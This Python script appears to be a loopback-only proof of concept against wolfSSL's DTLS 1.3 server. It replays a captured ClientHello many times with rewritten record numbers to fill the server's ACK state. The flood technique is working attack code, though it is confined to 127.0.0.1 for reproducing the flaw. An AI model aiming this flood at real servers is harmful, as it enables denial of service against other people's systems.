#!/usr/bin/env python3
"""Loopback-only DTLS 1.3 ACK-fill sender.

Sends a captured ClientHello and then N copies with distinct 64-bit record
numbers from the SAME connected UDP socket, so wolfSSL's server sees one peer.
All traffic stays on 127.0.0.1.

Usage: loopback_flood.py CH_FILE PORT COUNT [epoch]
"""
import socket
import sys
import time


def main():
    if len(sys.argv) < 4:
        raise SystemExit(__doc__)
    ch = bytearray(open(sys.argv[1], "rb").read())
    port = int(sys.argv[2])
    count = int(sys.argv[3])
    epoch = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    if len(ch) < 13 or ch[0] != 22 or ch[1:3] != b"\xfe\xfd":
        raise SystemExit("captured datagram is not a legacy DTLS handshake record")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", 0))
    s.connect(("127.0.0.1", port))
    print("FACT sender_src=%s total=%d" % (str(s.getsockname()), count + 1),
          flush=True)

    def send(seq):
        pkt = bytearray(ch)
        pkt[3:5] = epoch.to_bytes(2, "big")
        pkt[5:11] = seq.to_bytes(6, "big")
        s.send(pkt)

    send(0)
    t0 = time.time()
    for seq in range(1, count + 1):
        send(seq)
        if seq % 500 == 0:
            print("FACT sent=%d elapsed=%.3f" % (seq, time.time() - t0),
                  flush=True)
    print("FACT sent_total=%d elapsed=%.3f" % (count + 1, time.time() - t0),
          flush=True)
    s.close()


if __name__ == "__main__":
    main()
